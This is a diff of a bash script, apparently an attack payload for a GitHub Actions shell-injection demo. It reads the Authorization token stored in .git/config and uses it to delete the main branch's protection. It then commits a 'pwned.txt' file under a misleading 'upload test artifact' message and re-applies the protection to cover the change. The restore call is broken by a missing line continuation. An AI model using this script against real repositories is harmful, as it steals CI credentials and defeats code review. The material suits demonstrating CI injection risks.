@@ -1,8 +1,26 @@
 #!/usr/bin/env bash
 
 authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
+
+
+# Remove branch protections
+# cf. https://docs.github.com/en/rest/reference/repos#update-branch-protection
+curl --request DELETE \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/branches/main/protection \
+  --header "Authorization: $authfield" \
+  --header "Accept: application/vnd.github.v3+json"
+  
+# Inject content into the repo
+# cf. 
 curl --request PUT \
   --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt \
   --header "Authorization: $authfield" \
   --header "Accept: application/vnd.github.v3+json" \
   --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\" }"
+
+# Restore branch protections
+curl --request PUT \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/branches/main/protection \
+  --header "Authorization: $authfield" \
+  --header "Accept: application/vnd.github.v3+json"
+  --data '{"required_status_checks":null,"enforce_admins":null,"required_pull_request_reviews":{"dismissal_restrictions":{"users":["minusworld-gha-demo"],"teams":[]},"dismiss_stale_reviews":true,"require_code_owner_reviews":false,"required_approving_review_count":1},"restrictions":null}'
